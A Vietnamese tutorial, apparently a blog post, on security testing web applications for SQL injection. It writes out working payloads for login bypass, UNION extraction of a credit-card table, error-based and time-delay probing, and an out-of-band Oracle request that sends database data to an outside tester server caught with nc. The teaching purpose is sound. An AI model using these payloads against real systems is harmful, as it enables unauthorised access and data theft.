Qua 2 bài trước chúng ta cũng đã nắm được sơ bộ kiểm thử bảo mật là gì, các lỗ hổng và phương pháp kiểm thử phổ biến. Bài hôm nay chúng ta sẽ đi sâu vào một phương pháp cụ thể để kiểm thử bảo mật với lỗ hổng xưa xứa xừa xưa nhưng vẫn rất nhiều coder mắc phải. Đặc biệt ảnh hưởng của lỗ hổng này là rất lớn vì hacker có thể truy vấn được toàn bộ thông tin trong database. Phương pháp tôi muốn đề cập đến là kiểm thử bảo mật SQL Injection.
## 1.SQL Injection là gì?
### Định nghĩa : 
SQL Injection là một trong những kiểu hack web bằng cách inject các mã SQLquery/command vào input trước khi chuyển cho ứng dụng web xử lí, hacker có thể login mà không cần username và password, remote execution (thực thi từ xa), dump data và lấy root của SQL server. 
Công cụ dùng để tấn công là một trình duyệt web bất kì, chẳng hạn như Internet Explorer, Netscape, Lynx, …

**Ví dụ :**

Ví dụ kinh điển là câu lệnh truy vấn thông tin đăng nhập như sau : 
```
select user_name, pass_word from news where pass_word =$pass_word
```
Trong ví dụ trên thì $pass_word là phần động do user truyền vào, còn lại phần tĩnh do coder thực hiện. Bằng cách chèn (inject) một thủ thuật vào giá trị của $pass_word thì hacker có thể vượt qua phần kiểm tra này
```
select user_name, pass_word from news where pass_word =10 or 1=1
```

**Phân loại :**

SQL Injection có thể chia vào 3 loại như sau :

(1)**Inband** : dữ liệu được trích xuất cùng một kênh (channel) dùng để chèn mã SQL. Đây là cách tấn công đơn giản nhất, trong đó các dữ liệu quan trọng sẽ được phơi bày lồ lộ trên website. 

(2)**Out of band** : dữ liệu được trích xuất trên một kênh khác với kênh chèn mã SQL (ví dụ gửi email dữ liệu được trích xuất). 

(3)**Tác động dữ liệu** : dữ liệu không được trích xuất mà tester thực hiện gửi lại các request và theo dõi hành vi tương ứng của DB Server. 
Kỹ thuật test:
Có 5 kỹ thuật cơ bản để test SQL Injection, tester có thể dùng độc lập từng kỹ thuật hoặc kết hợp 2,3 loại kỹ thuật cùng lúc

(1)**Sử dụng Union** : sử dụng Union để chèn kết quả của câu lệnh truy vấn. Hoặc thêm một câu lệnh SQL sau câu lệnh select

(2)**Sử dụng Boolean** : sử dụng các điều kiện AND/OR/XOR/NOT (dạng boolean) để câu truy vấn trả về kết quả theo đúng yêu cầu (true hoặc false). Ví dụ ở trên là một dạng sử dụng kỹ thuật này.

(3)**Sử dụng Error** : kỹ thuật dò và cập nhật vào database để sinh ra lỗi. Tester có thể dựa trên các thông tin này để thiết kế phương án tấn công. Đây là kỹ thuật cao cấp, cần có kiến thức nhất định về database và coding.

(4)**Out of band** : kỹ thuật lấy dữ liệu thông qua một kênh khác

(5)**Time delay** : sử dụng câu lệnh database (sleep) để delay kết quả trả về result.

### 2.Phương pháp triển khai Test SQL Injection :
**Kỹ thuật chung** : 

**Bước 1** : Test cần nắm được khi nào ứng dụng tương tác với database để truy vấn dữ liệu. Ví dụ một số form như sau :

- Authentication : các form đăng nhập

- Search :  các form search, cho phép nhập thông tin filter từ textbox

- E-Commerce : các form mua bán hàng hóa

Cách nắm được đầy đủ nhất là thông qua các testcase hoặc requirement của dự án.

**Bước 2** : Tester sẽ thực hiện tạo một danh sách các trường dữ liệu mà giá trị có thể dùng để chèn (injection) SQL, bao gồm cả các trường ẩn (hidden field). 

**Bước 3** : Xây dựng Test case cho kiểm thử SQL Injection. Chú ý khi dựng testcase chỉ thực hiện với từng trường độc lập, không nên test cùng lúc 2-3 trường thông tin khác nhau. Dựa theo 5 kỹ thuật test ở trên để thực hiện testcase. Ví dụ với kỹ thuật sử dụng Error, tester truyền vào các ký tự đặc biệt như nháy đơn (‘), chấm phẩy ( ; ) để xem kết quả lỗi trả về như nào. Ít nhất cũng có thể biết website đang dùng DB nào để dễ bề tấn công.

Dưới đây là chi tiết các kỹ thuật test mà tester có thể sử dụng để đưa vào testcase.

### Kỹ thuật test SQL Injection truyền thống :
**(1)Kỹ thuật Boolean với form đăng nhập**

**Ví dụ 1: sử dụng thuần các điều kiện Boolean (OR, AND…)**
```
SELECT * FROM Users WHERE Username='$username' AND Password='$password'
```

Test case
```
$username = 1' or '1' = '1
$password = 1' or '1' = '1
```
Câu lệnh sẽ là
```
SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
```

Như vậy câu lệnh sẽ luôn trả về kết quả là TRUE và tester sẽ truy cập được vào hệ thống mà không cần đúng thông tin đăng nhập.

**Ví dụ 2: Kết hợp các ký tự đặc biệt**

Câu lệch truy vấn dữ liệu ở form đăng nhập với password mã hóa dạng MD5. Lúc này thì mình sẽ không động vào thằng password nữa
```
SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password'))) 
```
Test case
```
$username = 1' or '1' = '1'))/*
$password = foo
```
Câu lệnh sẽ là
```
SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) 
```
Chú ý phần bôi đỏ nhé, đây là một testcase khá hay để xem việc xử lý các ký tự đặc biệt của coder có ổn không. Với việc thêm dấu /* thì toàn bộ phần script sau dấu này (check password) sẽ được coi là comment khi thực thi SQL. Nói đơn giản hơn như sau
```
SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) 
```
Tương đương
```
SELECT * FROM Users WHERE ((Username='1' or '1' = '1')) 
```

**(2)Kỹ thuật Boolean với form hiển thị thông tin** : 

Chúng ta cũng có thể sử dụng kỹ thuật Boolean với form hiển thị thông tin. 
Câu lệnh truy vấn thông tin sản phẩm như sau
```
SELECT * FROM products WHERE id_product=$id_product
```
URL request là
```
http://www.example.com/product.php?id=10
```
Test case : chỉnh sửa URL request
```
http://www.example.com/product.php?id=10 AND 1=2
```
hoặc
```
http://www.example.com/product.php?id=10 AND 1=1
```
Từ đó xem kết quả đầu ra để đánh giá form này có khả năng bị tấn công bằng SQL Injection không?

**(3) Kỹ thuật Union với form bất kỳ** : 

Tùy thuộc vào loại database mà có thể thực hiện được kỹ thuật này hay không.

Câu lệnh truy vấn
```
SELECT * FROM products WHERE id_product=$id_product
```
URL request là
```
http://www.example.com/product.php?id=10
```
Test case : chỉnh sửa URL request
```
http://www.example.com/product.php?id=10; INSERT INTO users (…)
```
Nếu câu lệnh này mà chạy được thì lỗi rất là to rồi, tha hồ mà tổng sỉ vả coder. 

**Kỹ thuật test SQL Injection nhằm khai thác dữ liệu:**

**(1)Kỹ thuật Union**

Chúng lại tiếp tục khai thác ở Form truy vấn thông tin, câu lệnh cơ bản như sau
```
SELECT Name, Phone, Address FROM Users WHERE Id=$id
```
Test case, set giá trị $id
```
$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```
Câu lệnh khi chạy sẽ là
```
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```
Khi đó ngoài việc hiển thị thông tin trong bảng users, kết quả sẽ trả về toàn bộ dữ liệu quan trọng trong bảng CreditCard. Tất nhiên đây là khi Tester nắm được đúng tên bảng và tên trường rồi (đây là kỹ thuật GreyBox, có thể sử dụng khi tester nắm tài liệu thiết kế CSDL).
Trong trường hợp Tester không được biết thiết kế CSDL (test Blackbox), tất nhiên vẫn có một số cách để dò số lượng trường và tên trường trong câu select.

Test case dò số lượng trường
```
http://www.example.com/product.php?id=10 ORDER BY 10--
```
Nếu có ít hơn 10 trường trong câu select, sẽ có thông báo lỗi, kiểu như sau
```
Unknown column '10' in 'order clause'
```
Cứ dò lần lượt, hơi mất thời gian chút nhưng sẽ ra được chính xác số lượng trường dữ liệu. Sau khi có số lượng trường rồi, lại dò tiếp tên trường

Test dò tên trường
```
http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--
```
Lúc này hệ thống sẽ báo lỗi sai định dạng các kiểu, từ đó ta sẽ có thông tin tên trường
```
All cells in a column must have the same datatype
```
**(2)Kỹ thuật Error**

Kỹ thuật nhằm khai thác các thông tin như loại database, tên database, tên bảng… từ các thông báo lỗi. Phần này yêu cầu Tester có kiến thức khá vững về database

Ví dụ  from hiển thị thông tin hàng
```
SELECT * FROM products WHERE id_product=$id_product
```
URL tương ứng
```
http://www.example.com/product.php?id=10
```
Testcasse (ví dụ database là Oracle 10g)
```
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
```
Tester sẽ nhận được thông tin tên schema của ứng dụng web thông tin thông báo lỗi như sau
```
ORA-292257: host SCOTT unknown
```
**(3)Kỹ thuật Out of band**

URL test
```
http://www.example.com/product.php?id=10
```
Test case
```
http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
```
Dữ liệu trong câu lệnh SELECT sẽ được truyền đến testerserver
```
/home/tester/nc –nLp 80
GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```
**(4)Kỹ thuật Time Delay**
URL Test
```
http://www.example.com/product.php?id=10
```
Test case (với database sử dụng là MySQL)
```
http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--
```
Trong ví dụ này, tester check xem nếu đây là MySQL version 5 hay không và thực hiện làm trễ trả kết quả trong 10s.

### 3.Công cụ Test tự động :
- **SQLMap** : đây là công cụ khá tốt tự động kiểm thử SQL Injection. Hỗ trợ nhiều database khác nhau (MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB và H2). Hỗ trợ đầy đủ các kỹ thuật kiểm thử (Boolean, Union, Error…). Hướng dẫn sử dụng công cụ phải làm một bài riêng.
- **SQLSmack** : đây là công cụ kiểm tra SQL Injection với các web sử dụng database MSSQL. Gọi là công cụ nhưng thực ra là 1 đoạn script Perl, chạy trên UNIX. Rất đơn giản và dễ xài, tuy nhiên cần môi trường Unix để chạy.
### 4.Tham khảo:
https://www.softwaretestinghelp.com/sql-injection-how-to-test-application-for-sql-injection-attacks/

https://www.guru99.com/learn-sql-injection-with-practical-example.html

https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)

https://whitehat.vn/threads/tim-hieu-ve-sql-injection-va-cach-phong-chong.11591/

https://www.hacksplaining.com/prevention/sql-injection